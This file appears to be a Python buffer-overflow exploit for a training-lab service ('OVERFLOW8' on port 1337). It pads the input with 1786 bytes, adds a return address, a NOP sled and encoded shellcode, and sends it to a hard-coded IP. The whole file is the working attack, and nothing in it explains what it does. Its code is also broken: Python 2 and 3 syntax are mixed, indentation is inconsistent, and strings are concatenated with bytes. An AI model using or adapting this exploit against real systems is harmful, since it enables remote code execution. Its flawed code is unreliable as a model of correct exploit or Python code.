#!/usr/bin/python
import sys, socket
from time import sleep

buf =  b""
buf += b"\xdb\xc3\xd9\x74\x24\xf4\x5b\xba\x72\x8e\x37\x06\x2b"
buf += b"\xc9\xb1\x52\x31\x53\x17\x83\xeb\xfc\x03\x21\x9d\xd5"
buf += b"\xf3\x39\x49\x9b\xfc\xc1\x8a\xfc\x75\x24\xbb\x3c\xe1"
buf += b"\x2d\xec\x8c\x61\x63\x01\x66\x27\x97\x92\x0a\xe0\x98"
buf += b"\x13\xa0\xd6\x97\xa4\x99\x2b\xb6\x26\xe0\x7f\x18\x16"
buf += b"\x2b\x72\x59\x5f\x56\x7f\x0b\x08\x1c\xd2\xbb\x3d\x68"
buf += b"\xef\x30\x0d\x7c\x77\xa5\xc6\x7f\x56\x78\x5c\x26\x78"
buf += b"\x7b\xb1\x52\x31\x63\xd6\x5f\x8b\x18\x2c\x2b\x0a\xc8"
buf += b"\x7c\xd4\xa1\x35\xb1\x27\xbb\x72\x76\xd8\xce\x8a\x84"
buf += b"\x65\xc9\x49\xf6\xb1\x5c\x49\x50\x31\xc6\xb5\x60\x96"
buf += b"\x91\x3e\x6e\x53\xd5\x18\x73\x62\x3a\x13\x8f\xef\xbd"
buf += b"\xf3\x19\xab\x99\xd7\x42\x6f\x83\x4e\x2f\xde\xbc\x90"
buf += b"\x90\xbf\x18\xdb\x3d\xab\x10\x86\x29\x18\x19\x38\xaa"
buf += b"\x36\x2a\x4b\x98\x99\x80\xc3\x90\x52\x0f\x14\xd6\x48"
buf += b"\xf7\x8a\x29\x73\x08\x83\xed\x27\x58\xbb\xc4\x47\x33"
buf += b"\x3b\xe8\x9d\x94\x6b\x46\x4e\x55\xdb\x26\x3e\x3d\x31"
buf += b"\xa9\x61\x5d\x3a\x63\x0a\xf4\xc1\xe4\x3f\x04\xca\x18"
buf += b"\x57\x14\xcc\xf1\xf4\x91\x2a\x9b\x14\xf4\xe5\x34\x8c"
buf += b"\x5d\x7d\xa4\x51\x48\xf8\xe6\xda\x7f\xfd\xa9\x2a\xf5"
buf += b"\xed\x5e\xdb\x40\x4f\xc8\xe4\x7e\xe7\x96\x77\xe5\xf7"
buf += b"\xd1\x6b\xb2\xa0\xb6\x5a\xcb\x24\x2b\xc4\x65\x5a\xb6"
buf += b"\x90\x4e\xde\x6d\x61\x50\xdf\xe0\xdd\x76\xcf\x3c\xdd"
buf += b"\x32\xbb\x90\x88\xec\x15\x57\x63\x5f\xcf\x01\xd8\x09"
buf += b"\x87\xd4\x12\x8a\xd1\xd8\x7e\x7c\x3d\x68\xd7\x39\x42"
buf += b"\x45\xbf\xcd\x3b\xbb\x5f\x31\x96\x7f\x7f\xd0\x32\x8a"
buf += b"\xe8\x4d\xd7\x37\x75\x6e\x02\x7b\x80\xed\xa6\x04\x77"
buf += b"\xed\xc3\x01\x33\xa9\x38\x78\x2c\x5c\x3e\x2f\x4d\x75"

ret = '\xaf\x11\x50\x62'
nop = '\x90' * 32

buffer = "A" * 1786 + ret + nop + buf

while True:
        try:
        	print('FUZZED WITH BUFFER SIZE OF ' + str(len(buffer)))
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('10.10.145.59',1337))
                s.send(('OVERFLOW8 ' + buffer))
                s.recv(1024)
                s.close()
                sleep(1)
               

        except:
                print 'FUZZING crashed at %s bytes' % str(len(buffer))
                sys.exit()
